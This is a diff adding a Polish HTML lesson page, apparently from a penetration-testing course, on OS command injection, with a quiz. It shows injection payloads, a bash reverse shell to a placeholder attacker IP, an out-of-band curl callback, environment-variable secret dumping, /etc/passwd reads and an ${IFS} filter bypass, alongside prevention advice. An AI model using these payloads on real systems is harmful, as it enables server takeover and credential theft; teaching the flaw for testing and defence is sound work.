@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="pl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lekcja 11: OS Command Injection - Kurs Pentestera</title>
+
+    <link rel="stylesheet" href="style.css">
+
+    <style>
+        /* Akcent: Terminal Green (Matrix/Shell) */
+        :root {
+            --accent: #00ff00;
+            --accent-glow: rgba(0, 255, 0, 0.3);
+        }
+
+        .cmd-prompt {
+            color: #00ff00;
+            font-family: monospace;
+            font-weight: bold;
+        }
+
+        .cmd-input {
+            color: #fff;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+        <header>
+            <h1>OS COMMAND INJECTION</h1>
+            <p>MODUŁ 11: Przejęcie terminala, Operatory i Wyciek Zmiennych Środowiskowych</p>
+        </header>
+
+        <!-- 1. DEFINICJA -->
+        <section>
+            <h2>> SYSTEM SHELL ACCESS</h2>
+            <p>To "święty graal" ataków. Występuje, gdy aplikacja webowa przekazuje dane użytkownika bezpośrednio do
+                powłoki systemowej (bash, sh, cmd.exe) bez filtracji.</p>
+
+            <div class="card">
+                <h3>ANATOMIA ATAKU</h3>
+                <p>Wyobraź sobie narzędzie "Sprawdź status serwera" (Ping).</p>
+                <div style="background:#000; padding:15px; border:1px solid #333; font-family:monospace;">
+                    <span class="comment"># Kod backendu (uproszczony Python):</span><br>
+                    os.system("ping -c 1 " + user_input)
+                </div>
+
+                <p>Jeśli wpiszesz <code>8.8.8.8</code>, serwer wykona:<br>
+                    <code>ping -c 1 8.8.8.8</code>
+                </p>
+
+                <p>Ale jeśli wpiszesz <code>8.8.8.8; whoami</code>, serwer wykona:<br>
+                    <code>ping -c 1 8.8.8.8; <span class="highlight">whoami</span></code>
+                </p>
+
+                <p><strong>Efekt:</strong> Serwer odpowie wynikiem pingu ORAZ nazwą użytkownika systemowego (np.
+                    <code>www-data</code> lub <code>root</code>).</p>
+            </div>
+        </section>
+
+        <!-- 2. OPERATORY -->
+        <section>
+            <h2>> SŁOWNIK OPERATORÓW</h2>
+            <p>Aby "dokleić" swoje polecenie, musisz znać znaki specjalne terminala.</p>
+
+            <div class="card">
+                <table>
+                    <tr>
+                        <th>Operator</th>
+                        <th>Znaczenie (Linux/Unix)</th>
+                    </tr>
+                    <tr>
+                        <td><code>;</code></td>
+                        <td><strong>Separator sekwencyjny.</strong> "Wykonaj to, a potem tamto". (Działa nawet jak
+                            pierwsze polecenie zwróci błąd).</td>
+                    </tr>
+                    <tr>
+                        <td><code>&</code> lub <code>&&</code></td>
+                        <td><strong>Uruchom w tle / AND.</strong> <code>cmd1 && cmd2</code> wykonuje cmd2 tylko jeśli
+                            cmd1 się uda.</td>
+                    </tr>
+                    <tr>
+                        <td><code>|</code> lub <code>||</code></td>
+                        <td><strong>Pipe / OR.</strong> <code>|</code> przekazuje wynik jednego polecenia do drugiego.
+                            <code>||</code> wykonuje drugie, jeśli pierwsze zawiedzie.</td>
+                    </tr>
+                    <tr>
+                        <td><code>$()</code> lub <code>``</code></td>
+                        <td><strong>Command Substitution.</strong> Wynik polecenia wstawiany jest w miejsce tekstu. Np.
+                            <code>ping $(whoami).hacker.com</code>.</td>
+                    </tr>
+                </table>
+            </div>
+        </section>
+
+        <!-- 3. CELE I ENV -->
+        <section>
+            <h2>> CO KRADNIEMY? (IMPACT)</h2>
+            <p>Masz RCE (Remote Code Execution). Co teraz?</p>
+
+            <div class="card">
+                <h3>1. ENVIRONMENT VARIABLES LEAKAGE 💎</h3>
+                <p>W nowoczesnych aplikacjach (Docker, Kubernetes, Node.js) najważniejsze sekrety NIE są w plikach
+                    konfiguracyjnych, ale w <strong>zmiennych środowiskowych</strong>.</p>
+                <p><strong>Komendy:</strong> <code>printenv</code>, <code>env</code>, <code>set</code> (Windows).</p>
+                <p><strong>Co tam znajdziesz?</strong></p>
+                <ul>
+                    <li><code>AWS_ACCESS_KEY_ID</code> (Klucze do chmury)</li>
+                    <li><code>DB_PASSWORD</code> (Hasło do bazy)</li>
+                    <li><code>STRIPE_API_KEY</code> (Płatności)</li>
+                </ul>
+                <p class="comment">// To często szybsza droga do przejęcia firmy niż szukanie plików konfiguracyjnych.
+                </p>
+            </div>
+
+            <div class="card">
+                <h3>2. REVERSE SHELL (Pełna kontrola)</h3>
+                <p>Zamiast wpisywać komendy w URL, zmuszasz serwer, by połączył się z Twoim terminalem.</p>
+                <p><strong>Atakujący (nasłuch):</strong> <code>nc -lvnp 4444</code></p>
+                <p><strong>Ofiara (Payload):</strong> <code>bash -i >& /dev/tcp/ATAKUJACY_IP/4444 0>&1</code></p>
+                <p><strong>Efekt:</strong> Dostajesz interaktywną konsolę serwera u siebie.</p>
+            </div>
+        </section>
+
+        <!-- 4. BLIND RCE -->
+        <section>
+            <h2>> BLIND COMMAND INJECTION</h2>
+            <p>Co jeśli serwer wykonuje komendę, ale nie wyświetla wyniku na stronie?</p>
+
+            <div class="card">
+                <ul>
+                    <li><strong>Time-Based:</strong> Wpisujesz <code>; sleep 10</code>. Jeśli strona ładuje się 10
+                        sekund dłużej -> Masz RCE.</li>
+                    <li><strong>Out-of-Band (OAST):</strong> Wpisujesz <code>; curl http://twoj-serwer.com</code>. Jeśli
+                        w logach swojego serwera zobaczysz połączenie -> Masz RCE.</li>
+                </ul>
+            </div>
+        </section>
+
+        <!-- CHECKLIST -->
+        <section>
+            <h2>CHECKLISTA / RED FLAGS</h2>
+            <div class="card checklist-card">
+                <div class="checklist-item">
+                    <span class="check-icon">⚠</span>
+                    <div><strong>Narzędzia administracyjne:</strong> Funkcje typu "Ping", "Traceroute", "Check DNS",
+                        "ImageMagick Convert". To klasyczne punkty wejścia.</div>
+                </div>
+                <div class="checklist-item">
+                    <span class="check-icon">⚠</span>
+                    <div><strong>PDF Generators:</strong> Często pod spodem używają narzędzi systemowych (np.
+                        `wkhtmltopdf`), do których można "dokleić" parametry.</div>
+                </div>
+                <div class="checklist-item">
+                    <span class="check-icon">⚠</span>
+                    <div><strong>.env i Environment:</strong> Jeśli masz RCE, pierwsza komenda to `env` lub `printenv`.
+                        Tam leżą klucze do królestwa.</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- QUIZ -->
+        <section id="quiz-section">
+            <h2>🎓 WERYFIKACJA WIEDZY</h2>
+            <div id="quiz-container"></div>
+        </section>
+
+        <footer>
+            <p style="text-align: center; margin-top: 50px; color: #555;">&copy; 2026 Kurs Pentestera | Moduł 11</p>
+        </footer>
+    </div>
+
+    <!-- DANE DO QUIZU -->
+    <script>
+        const quizData = [
+            {
+                question: "Czym jest OS Command Injection?",
+                options: [
+                    "Wstrzyknięciem kodu SQL do bazy danych.",
+                    "Błędem pozwalającym na wykonanie poleceń systemowych (shell) na serwerze ofiary.",
+                    "Zdalnym restartem przeglądarki.",
+                    "Nadpisaniem plików CSS."
+                ],
+                correct: 1,
+                explanation: "To błąd w kodzie backendu, który przekazuje dane użytkownika bezpośrednio do funkcji systemowych (np. exec, system, shell_exec)."
+            },
+            {
+                question: "Co robi operator średnika ( ; ) w terminalu Linux/Unix?",
+                options: [
+                    "Kończy linię kodu.",
+                    "Pozwala wykonać drugie polecenie niezależnie od wyniku pierwszego (separator poleceń).",
+                    "Jest znakiem komentarza.",
+                    "Służy do łączenia stringów."
+                ],
+                correct: 1,
+                explanation: "Dzięki średnikowi możesz napisać `prawdziwa_komenda; twoja_złośliwa_komenda`. Serwer wykona obie po kolei."
+            },
+            {
+                type: "scenario",
+                question: "Uzyskałeś RCE na serwerze z aplikacją w kontenerze Docker. Jaką komendę wpiszesz jako pierwszą, aby szybko znaleźć klucze API i hasła?",
+                options: [
+                    "ls -la",
+                    "whoami",
+                    "printenv (lub env)",
+                    "ping google.com"
+                ],
+                correct: 2,
+                explanation: "W środowiskach chmurowych/kontenerowych (12-factor app) sekrety są przekazywane przez zmienne środowiskowe. `printenv` wyświetli je wszystkie w formacie tekstowym."
+            },
+            {
+                question: "Na czym polega 'Blind OS Command Injection'?",
+                options: [
+                    "Serwer wykonuje komendę, ale nie zwraca jej wyniku na stronie www.",
+                    "Serwer nie wykonuje komendy.",
+                    "Atakujący nie widzi ekranu.",
+                    "Komendy są szyfrowane."
+                ],
+                correct: 0,
+                explanation: "Wymaga to sprytu. Musisz użyć opóźnień czasowych (`sleep`) lub połączeń zwrotnych (`curl`), aby potwierdzić, że komenda zadziałała."
+            },
+            {
+                question: "Co to jest Reverse Shell?",
+                options: [
+                    "Powłoka graficzna systemu Windows.",
+                    "Technika, w której to serwer ofiary łączy się z komputerem atakującego, udostępniając mu interaktywny terminal.",
+                    "Skrypt do odwracania kolorów w terminalu.",
+                    "Ochrona przed wirusami."
+                ],
+                correct: 1,
+                explanation: "Firewalle często blokują połączenia przychodzące (Bind Shell), ale przepuszczają wychodzące. Reverse Shell omija ten problem - serwer 'dzwoni do domu' (do hakera)."
+            },
+            {
+                type: "scenario",
+                question: "Widzisz pole 'Podaj IP do sprawdzenia'. Wpisujesz: '127.0.0.1 && cat /etc/passwd'. Co oznacza operator &&?",
+                options: [
+                    "Wykonaj drugie polecenie tylko wtedy, gdy pierwsze zakończy się sukcesem.",
+                    "Wykonaj drugie polecenie w tle.",
+                    "Przekaż wynik pierwszego polecenia do drugiego.",
+                    "To błąd składni."
+                ],
+                correct: 0,
+                explanation: "Operator AND (&&). Jeśli ping się uda (zwróci 0), wykonaj cat. Jeśli ping się nie uda, cat nie zostanie wykonany."
+            },
+            {
+                question: "Jaka funkcja w PHP jest znanym wektorem Command Injection?",
+                options: [
+                    "echo()",
+                    "system() / shell_exec() / passthru()",
+                    "include()",
+                    "strlen()"
+                ],
+                correct: 1,
+                explanation: "Te funkcje służą do wywoływania programów systemowych. Jeśli trafią do nich nieprzefiltrowane dane użytkownika - gra skończona."
+            },
+            {
+                question: "Dlaczego Command Injection jest zazwyczaj groźniejsze niż SQL Injection?",
+                options: [
+                    "Nie jest groźniejsze.",
+                    "Bo RCE daje pełną kontrolę nad serwerem (systemem operacyjnym), a SQLi zazwyczaj ogranicza się 'tylko' do bazy danych (choć z bazy czasem da się zrobić RCE).",
+                    "Bo SQLi jest trudne do wykrycia.",
+                    "Bo RCE działa tylko na Windowsie."
+                ],
+                correct: 1,
+                explanation: "Mając RCE, możesz czytać pliki, instalować rootkity, skanować sieć wewnętrzną, kopać kryptowaluty i atakować inne serwery. To 'Game Over'."
+            },
+            {
+                type: "scenario",
+                question: "Aplikacja używa czarnej listy i blokuje spacje. Jak możesz to obejść w systemie Linux?",
+                options: [
+                    "Nie da się.",
+                    "Użyć znaku przekierowania wejścia '<' lub zmiennej ${IFS} (Internal Field Separator).",
+                    "Wpisać spację dwa razy.",
+                    "Użyć tabulatora (nie zadziała w URL)."
+                ],
+                correct: 1,
+                explanation: "W Bashu `cat${IFS}/etc/passwd` zadziała tak samo jak `cat /etc/passwd`. To klasyczna technika omijania WAF (Web Application Firewall)."
+            },
+            {
+                question: "Jaki jest najskuteczniejszy sposób zapobiegania Command Injection?",
+                options: [
+                    "Usuwanie średników z inputu.",
+                    "Unikanie wywoływania komend systemowych. Używanie wbudowanych bibliotek języka (np. biblioteka do przetwarzania obrazów zamiast wywoływania ImageMagick przez shell).",
+                    "Uruchamianie serwera jako root.",
+                    "Instalacja antywirusa."
+                ],
+                correct: 1,
+                explanation: "Jeśli nie musisz używać shella - nie używaj go. Jeśli musisz - używaj funkcji, które przyjmują argumenty jako listę/tablicę, a nie jako jeden sklejony ciąg znaków."
+            }
+        ];
+    </script>
+
+    <script src="quiz.js"></script>
+
+</body>
+
+</html>
